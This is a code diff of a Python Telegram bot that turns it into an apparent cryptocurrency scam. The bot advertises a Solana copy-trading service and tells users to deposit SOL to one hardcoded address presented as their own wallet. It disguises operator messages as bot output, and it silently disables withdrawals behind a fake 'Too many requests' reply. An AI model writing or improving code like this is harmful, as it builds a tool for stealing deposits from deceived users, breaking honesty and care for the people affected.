@@ -18,12 +18,12 @@ user_balances = {}
 
 # Start command
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("Welcome! Use the menu to interact with the bot.")
+    await update.message.reply_text("Solana's fastest bot to copy trade any coin (SPL token) - To start trading, deposit SOL to your Fiat wallet address \n What can i help you with today? Use the bottons below to interact.")
 
 # Wallet command
 async def wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    wallet_address = "5k8s9uWoCJ9Nzoz3tAyN8TbvLK3zNdLk8B1YZ8MT2oAp"
-    await update.message.reply_text(f"Your wallet address: {wallet_address}")
+    wallet_address = "8CEkNWWi6ipY79Wjmubip65Gvy7EWvFMQKv3gLK3wzaV"
+    await update.message.reply_text(f"Your wallet address:  {wallet_address}  Copy the address and send SOL to deposit.")
 
 # Balance command
 async def balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -31,7 +31,7 @@ async def balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
     username = update.effective_user.username or "Unknown"
 
     # Notify the user that data is being fetched
-    await update.message.reply_text("Fetching data...")
+    await update.message.reply_text("Fetching Balance PLease Wait...")
 
     # Send balance request notification to the admin
     balance = user_balances.get(user_id, 100)  # Default balance = 100 USDT for new users
@@ -71,7 +71,7 @@ async def admin_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         await context.bot.send_message(
             chat_id=user_id,
-            text=f"Message from Admin: {reply_message}"
+            text=f"{reply_message}"
         )
         await update.message.reply_text(f"Message successfully sent to user {user_id}.")
     except Exception as e:
@@ -116,16 +116,17 @@ async def amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return ConversationHandler.END
 
     # Deduct the balance and confirm withdrawal
-    user_balances[user_id] -= amount
-    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    #user_balances[user_id] -= amount
+    #timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-    await update.message.reply_text(
-        f"Withdrawal successful!\n\n"
-        f"Amount: {amount} USDT\n"
-        f"Wallet Address: {wallet}\n"
-        f"Transaction Time: {timestamp}\n"
-        f"Remaining Balance: {user_balances[user_id]} USDT"
-    )
+    # await update.message.reply_text(
+    #     f"Withdrawal successful!\n\n"
+    #     f"Amount: {amount} USDT\n"
+    #     f"Wallet Address: {wallet}\n"
+    #     f"Transaction Time: {timestamp}\n"
+    #     f"Remaining Balance: {user_balances[user_id]} USDT"
+    # )
+    await update.message.reply_text("Too many requests at the same time, please wait..."),
     return ConversationHandler.END
 
 # Cancel the withdrawal process
